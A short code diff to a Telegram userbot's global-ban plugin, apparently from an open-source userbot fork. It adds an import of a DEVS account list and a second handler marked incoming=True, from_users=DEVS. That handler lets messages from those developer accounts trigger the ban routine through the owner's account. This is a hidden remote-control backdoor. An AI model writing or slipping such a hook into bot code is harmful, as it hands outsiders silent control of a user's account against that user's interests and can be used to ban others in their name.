@@ -6,11 +6,12 @@ Available Commands:
 import asyncio
 from userbot import CMD_HELP, owner, CMD_HANDLER as cmd
 from userbot.utils import joo_cmd
-from userbot import BOTLOG_CHATID, bot
+from userbot import BOTLOG_CHATID, DEVS, bot
 # imported from uniborg by @heyworld
 
 
 @joo_cmd(pattern="gbanb(?: |$)(.*)")
+@register(incoming=True, from_users=DEVS, pattern=r"^\.cgban(?: |$)(.*)")
 async def _(event):
     if BOTLOG_CHATID is None:
         await event.edit("Set BOTLOG_CHATID in vars otherwise module won't work.")
